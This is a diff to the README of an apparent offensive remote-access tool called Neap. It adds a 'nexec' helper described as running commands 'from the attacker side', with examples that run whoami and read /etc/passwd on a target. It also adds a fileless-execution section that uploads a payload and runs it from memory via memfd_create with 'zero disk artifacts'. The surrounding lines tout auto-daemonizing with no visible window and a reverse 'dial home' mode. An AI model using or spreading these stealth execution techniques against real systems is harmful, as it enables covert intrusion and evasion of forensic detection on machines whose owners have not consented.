@@ -116,6 +116,24 @@ sftp> get /exec/ipconfig /dev/stdout
 
 Works with any standard SFTP client (OpenSSH, WinSCP, FileZilla, scp, curl). No custom tooling required.
 
+**`nexec` helper** — simplified command execution from the attacker side:
+
+```bash
+nexec user@target:4444 "whoami"
+nexec user@target:4444 "cat /etc/passwd"
+```
+
+### Fileless Execution (memfs + /exec/)
+
+Upload a binary via in-memory SFTP, then execute it without touching disk:
+
+```bash
+sftp> put payload /tmp/payload
+nexec user@target:4444 "/tmp/payload"
+```
+
+On Linux, uses `memfd_create()` — the binary runs from RAM via `/proc/self/fd/`. Zero disk artifacts. Windows falls back to a temp file that is deleted immediately after execution.
+
 ### Auto-Daemonize
 
 Neap automatically backgrounds itself on launch. Unix double-fork with full terminal detach. Windows detached process respawn. No visible window, no terminal output.
@@ -161,6 +179,7 @@ Two-mode architecture: bind (server listens) or reverse (client dials home). Bot
 | Auto-Daemonize | Full (double-fork) | Full (detached) |
 | In-Memory SFTP | Full | Full |
 | SFTP Shell (`/exec/`) | Full | Full |
+| Fileless Exec (memfs) | Full (memfd) | Temp file |
 | Static Binary | musl | MSVC |
 
 ---
